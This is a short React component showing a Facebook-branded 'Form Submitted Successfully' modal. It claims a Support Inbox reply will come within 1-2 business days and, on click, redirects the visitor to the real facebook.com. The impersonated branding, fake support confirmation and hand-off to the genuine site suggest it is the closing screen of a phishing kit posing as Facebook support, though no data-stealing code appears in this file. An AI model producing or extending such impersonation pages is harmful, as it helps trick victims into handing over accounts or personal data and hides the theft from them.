import type { FC } from "react";

const FinishModal: FC = () => {
  return (
    <div
      onClick={() => window.location.replace("https://facebook.com")}
      aria-hidden="true"
      className="fixed top-0 right-0 left-0 z-50 flex h-[calc(100%-1rem)] w-screen items-center justify-center overflow-x-hidden overflow-y-hidden bg-black/50 p-4 md:inset-0"
    >
      <div className="relative max-h-full w-full max-w-2xl">
        <div className="relative rounded-lg bg-white shadow">
          <div className="bg-facebook flex items-start justify-between rounded-t border-b p-4">
            <h3 className="text-md font-semibold text-gray-600">
              Form Submitted Successfully
            </h3>
          </div>

          <div className="space-y-6 p-6">
            <p className="text-base leading-relaxed text-gray-500">
              Thanks for contacting us. You'll get a notification when we
              respond in 1-2 business days. You can view responses in your
              Support Inbox.
            </p>
          </div>

          <div className="flex items-center justify-end space-x-2 rounded-b border-t border-gray-200 p-4">
            <button
              type="button"
              className="finish-verify bg-facebook cursor-pointer rounded-lg bg-blue-800 px-5 py-2.5 text-center text-sm font-medium text-white focus:ring-4 focus:ring-blue-300 focus:outline-none"
            >
              OK
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default FinishModal;
